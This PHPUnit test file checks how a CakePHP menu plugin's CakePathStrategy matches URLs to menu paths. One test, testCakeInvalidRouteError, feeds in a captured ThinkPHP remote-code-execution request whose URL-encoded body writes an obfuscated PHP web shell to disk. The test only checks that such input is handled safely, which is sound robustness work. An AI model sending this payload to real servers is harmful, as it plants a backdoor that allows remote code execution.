<?php
namespace MagicMenu\Test;

use Cake\Routing\Router;
use Cake\TestSuite\TestCase;

use MagicMenu\CakePathStrategy;

class CakePathStrategyTest extends TestCase
{
    public function setUp():void
    {
        parent::setUp();

        Router::reload();

        // maintain compatibility with CakePHP < 4.0
        if (isset(Router::$initialized)) {
            Router::$initialized = true;
        }

        Router::scope('/', function ($routes) {
            $routes->connect('/', ['controller' => 'pages', 'action' => 'display', 'home']);
            $routes->connect('/some/path', ['controller' => 'random', 'action' => 'stuff']);
            $routes->connect('/*', ['controller' => 'Pages', 'action' => 'display']);
        });

        $this->Strategy = new CakePathStrategy();
    }

    protected function getDefaultMenuItems()
    {
        return [
            [
                'path' => [0],
                'item' => ['title' => 'About', 'url' => '/about'],
            ],
            [
                'path' => [1],
                'item' => ['title' => 'Work', 'url' => '/work'],
            ],
            [
                'path' => [1, 0],
                'item' => ['title' => 'Thiess', 'url' => '/work/thiess'],
            ],
            [
                'path' => [1, 1],
                'item' => ['title' => 'MAX Employment', 'url' => '/work/max-employment'],
            ],
            [
                'path' => [1, 2],
                'item' => ['title' => 'Spike & Dadda', 'url' => '/work/spike-and-dadda'],
            ],
            [
                'path' => [1, 3],
                'item' => ['title' => 'Spike & Dadda', 'url' => '/some/path'],
            ],
            [
                'path' => [2],
                'item' => ['title' => 'Contact', 'url' => '/contact'],
            ]
        ];
    }

    protected function getBasicQuerystringMenuItems()
    {
        return [
            [
                'path' => [0],
                'item' => ['url' => '/'],
            ],
            [
                'path' => [1],
                'item' => ['url' => '/?page=1'],
            ],
            [
                'path' => [2],
                'item' => ['url' => '/?page=2'],
            ],
            [
                'path' => [2, 0],
                'item' => ['url' => '/?page=2&pageSize=50'],
            ],
        ];
    }

    protected function getBasicHashMenuItems()
    {
        return [
            [
                'path' => [0],
                'item' => ['url' => '#hash-1'],
            ],
            [
                'path' => [1],
                'item' => ['url' => '#hash-2'],
            ],
        ];
    }

    public function testConstructor()
    {
        $url = '/totally/custom/url';
        $strategy = new CakePathStrategy($url);
        $result = $strategy->getUrl();
        $this->assertEquals($url, $result);

        $strategy = new CakePathStrategy();
        $result = $strategy->getUrl();
        $this->assertNull($result);
    }

    public function testSetUrlString()
    {
        $url = '/unique/mate';
        $result = $this->Strategy->setUrl($url);
        $this->assertSame($this->Strategy, $result, 'CakePathStrategy::setUrl() should be chainable');

        $result = $this->Strategy->getUrl();
        $this->assertEquals($url, $result);
    }

    public function testSetUrlArray()
    {
        $url = ['controller' => 'custom', 'action' => 'url'];
        $result = $this->Strategy->setUrl($url)->getUrl();
        $this->assertEquals($url, $result);
    }

    public function testExactString()
    {
        $url = '/work/thiess';
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [1, 0];
        $this->assertEquals($expected, $result);
    }

    public function testNoMatch()
    {
        $url = '/';
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [];
        $this->assertEquals($expected, $result);
    }

    public function testExactArray()
    {
        $url = ['controller' => 'Pages', 'action' => 'display', 'work'];
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [1];
        $this->assertEquals($expected, $result);
    }

    public function testOptionalQuerystring()
    {
        $url = '/work/thiess?ignore=me&me=too';
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [1, 0];
        $this->assertEquals($expected, $result);
    }

    public function testChildPassParams()
    {
        $url = '/contact/sub/page/here';
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [2];
        $this->assertEquals($expected, $result);
    }

    public function testParentPassParams()
    {
        $url = '/some/';
        $result = $this->Strategy->setUrl($url)->getActivePath($this->getDefaultMenuItems());
        $expected = [];
        $this->assertEquals($expected, $result);
    }

    public function testHashUrl()
    {
        $result = $this->Strategy->setUrl('/')->getActivePath($this->getBasicHashMenuItems());
        $expected = [];
        $this->assertEquals($expected, $result);
    }

    public function testCakeInvalidRouteError()
    {
        $result = $this->Strategy->setUrl('/index.php?s=index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=asdasdasd.php&vars[1][1]=%3C%3F%70%68%70%0D%0A%63%6C%61%73%73%20%53%59%58%5A%7B%0D%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%5F%64%65%73%74%72%75%63%74%28%29%7B%0D%0A%20%20%20%20%20%20%20%20%24%4C%53%55%4F%3D%22%56%44%4A%36%30%32%22%5E%22%5C%78%33%37%5C%78%33%37%5C%78%33%39%5C%78%35%33%5C%78%34%32%5C%78%34%36%22%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%40%24%4C%53%55%4F%28%22%24%74%68%69%73%2D%3E%4D%4B%4D%55%22%29%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0A%24%73%79%78%7A%3D%6E%65%77%20%53%59%58%5A%28%29%3B%0D%0A%40%24%73%79%78%7A%2D%3E%4D%4B%4D%55%3D%69%73%73%65%74%28%24%5F%47%45%54%5B%22%69%64%22%5D%29%3F%62%61%73%65%36%34%5F%64%65%63%6F%64%65%28%24%5F%50%4F%53%54%5B%22%39%30%39%30%22%5D%29%3A%24%5F%50%4F%53%54%5B%22%39%30%39%30%22%5D%3B%0D%0A%3F%3E')->getActivePath($this->getBasicHashMenuItems());
        $expected = [];
        $this->assertEquals($expected, $result);
    }

    // TODO: implement this functionality (and verify test is correct)
    // public function testQuerystringValues()
    // {
    //  $url = '/?lang=es&page=1';
    //  $result = $this->Strategy->setUrl($url)->getActivePath($this->getBasicQuerystringMenuItems());
    //  $expected = [1];
    //  $this->assertEquals($expected, $result);

    //  $url = '/?lang=es';
    //  $result = $this->Strategy->setUrl($url)->getActivePath($this->getBasicQuerystringMenuItems());
    //  $expected = [0];
    //  $this->assertEquals($expected, $result);

    //  $url = '/?page=2&pageSize=10';
    //  $result = $this->Strategy->setUrl($url)->getActivePath($this->getBasicQuerystringMenuItems());
    //  $expected = [2];
    //  $this->assertEquals($expected, $result);

    //  $url = '/?pageSize=50';
    //  $result = $this->Strategy->setUrl($url)->getActivePath($this->getBasicQuerystringMenuItems());
    //  $expected = [0];
    //  $this->assertEquals($expected, $result);
    // }
}
